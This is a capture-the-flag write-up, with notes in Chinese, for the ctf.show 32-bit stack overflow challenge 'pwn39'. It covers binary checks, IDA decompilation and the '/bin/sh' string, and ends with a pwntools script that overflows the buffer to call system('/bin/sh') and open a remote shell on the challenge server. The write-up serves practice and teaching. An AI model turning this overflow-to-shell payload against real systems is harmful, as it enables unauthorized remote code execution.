```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn39
```

```
tasike@tasike-VM:~/Desktop$ file pwn39
pwn39: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ed2ae81287a176fcf37eb26d4b8b706a15698fd8, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn39
[*] '/home/tasike/Desktop/pwn39'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

堆栈不可执行

`ida`查看：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts(asc_804876C);
  puts(asc_80487E0);
  puts(asc_804885C);
  puts(asc_80488E8);
  puts(asc_8048978);
  puts(asc_80489FC);
  puts(asc_8048A90);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : It has system and '/bin/sh',but they don't work together");
  puts("    * *************************************                           ");
  puts("Just easy ret2text&&32bit");
  ctfshow();
  puts("\nExit");
  return 0;
}
```

`ctfshow`函数：

```c
ssize_t ctfshow()
{
  char buf[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, buf, 0x32u);
}
```

`buf`与`ebp`距离为`0x12`

没有发现后门函数，但是发现`_system`函数：
```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

`Fn +  Shift + F12`查看字符串：

```
.rodata:08048750	00000008	C	/bin/sh
```

编写`attack39.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28242)
system = 0x080483A0
binsh = 0x08048750
payload = cyclic(0x12 + 0x4) + p32(system) + p32(0) + p32(binsh)
r.sendline(payload)
r.interactive()
```

